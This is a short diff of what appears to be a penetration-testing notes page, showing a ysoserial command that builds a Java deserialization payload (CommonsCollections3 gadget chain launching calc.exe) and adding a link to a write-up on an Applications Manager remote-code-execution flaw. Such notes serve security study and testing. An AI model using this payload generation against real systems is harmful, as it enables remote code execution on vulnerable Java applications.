@@ -14,3 +14,11 @@ generate payload example
 java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections3 calc.exe > payload.bin
 ```
 
+also see:
+
+{% embed url="https://blog.jamesotten.com/post/applications-manager-rce/" %}
+
+
+
+
+
